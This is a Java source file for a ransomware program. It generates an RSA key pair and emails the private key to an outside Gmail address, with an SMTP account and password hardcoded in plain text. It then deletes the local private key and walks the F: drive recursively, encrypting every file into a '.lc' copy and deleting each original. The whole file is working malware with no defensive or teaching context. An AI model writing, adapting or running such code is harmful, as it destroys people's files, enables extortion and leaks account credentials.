package ransomware;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**
 *
 * @author nhanpvt
 */
public class Ransomware {

    /**
     * @param args the command line arguments
     * @throws javax.mail.MessagingException
     */
    public static void main(String[] args) throws MessagingException {
        createKey();
        encryption(new File("F:/"));
    }

    static int spc_count = -1;

    private static void createKey() {
        try {
            SecureRandom sr = new SecureRandom();
            // Using RSA algorithm to generate keys of length 2048 (bits)
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
            kpg.initialize(2048, sr);

            // Initialize the key pair
            KeyPair kp = kpg.genKeyPair();
            // PublicKey
            PublicKey publicKey = kp.getPublic();
            // PrivateKey
            PrivateKey privateKey = kp.getPrivate();

            // Create file to save key
            File prKey = new File("F:/privateKey.rsa");
            File publicKeyFile = createKeyFile(new File("F:/publicKey.rsa"));
            File privateKeyFile = createKeyFile(prKey);

            // Save Public Key
            FileOutputStream fos = new FileOutputStream(publicKeyFile);
            fos.write(publicKey.getEncoded());
            fos.close();

            // Save Private Key
            fos = new FileOutputStream(privateKeyFile);
            fos.write(privateKey.getEncoded());
            fos.close();

            sendFile();
            prKey.delete();

        } catch (IOException | NoSuchAlgorithmException | MessagingException e) {
        }
    }

    private static File createKeyFile(File file) throws IOException {
        if (!file.exists()) {
            file.createNewFile();
        } else {
            file.delete();
            file.createNewFile();
        }
        return file;
    }

    public static void sendFile() throws AddressException, MessagingException {
        Properties mailServerProperties;
        Session getMailSession;
        MimeMessage mailMessage;

        // Step1: setup Mail Server
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");

        // Step2: get Mail Session
        getMailSession = Session.getDefaultInstance(mailServerProperties, null);
        mailMessage = new MimeMessage(getMailSession);

        // Mail of the recipient
        mailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("nhanpvt.ct@gmail.com"));

        // Mail subject
        mailMessage.setSubject("Private key ransomware");

        // The message
        BodyPart messagePart = new MimeBodyPart();
        messagePart.setText("File content private key");

        // Create file sending section
        BodyPart filePart = new MimeBodyPart();
        File file = new File("F://privateKey.rsa");
        DataSource source = new FileDataSource(file);
        filePart.setDataHandler(new DataHandler(source));
        filePart.setFileName(file.getName());

        // Merge files and messages and send them
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messagePart);
        multipart.addBodyPart(filePart);
        mailMessage.setContent(multipart);

        // Step3: Send mail
        Transport transport = getMailSession.getTransport("smtp");
        transport.connect("smtp.gmail.com", "nhannhan1972k@gmail.com", "taotennhan");
        transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
        transport.close();
    }

    private static void encryption(File aFile) {
        try {
            // Read file contain public key
            FileInputStream fis = new FileInputStream("F:/publicKey.rsa");
            byte[] b = new byte[fis.available()];
            fis.read(b);
            fis.close();

            // Create public key by content of public key file
            X509EncodedKeySpec spec = new X509EncodedKeySpec(b);
            KeyFactory factory = KeyFactory.getInstance("RSA");
            PublicKey pubKey = factory.generatePublic(spec);

            //Encrypt all file
            spc_count++;
            String spcs = "";
            for (int i = 0; i < spc_count; i++) {
                spcs += " ";
            }
            if (aFile.isFile()) {
                if (!"publicKey.rsa".equals(aFile.getName())) {
                    // Get file path
                    FileInputStream fis1 = new FileInputStream(aFile.getPath());
                    byte[] b1 = new byte[fis1.available()];
                    // Read file content
                    fis1.read(b1);
                    fis1.close();
                    // Encrypt data
                    Cipher c = Cipher.getInstance("RSA");
                    c.init(Cipher.ENCRYPT_MODE, pubKey);
                    byte encryptOut[] = c.doFinal(b1);
                    //create new file contain encrypt data
                    FileOutputStream fos = new FileOutputStream(aFile.getPath() + ".lc");
                    byte[] bf = Base64.getEncoder().encode(encryptOut);
                    fos.write(bf);
                    //delete a file
                    aFile.delete();
                }
            } else if (aFile.isDirectory()) {
                File[] listOfFiles = aFile.listFiles();
                if (listOfFiles != null) {
                    for (int i = 0; i < listOfFiles.length; i++) {
                        encryption(listOfFiles[i]);
                    }
                }
            }
            spc_count--;

        } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | InvalidKeySpecException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException ex) {
        }
    }

}
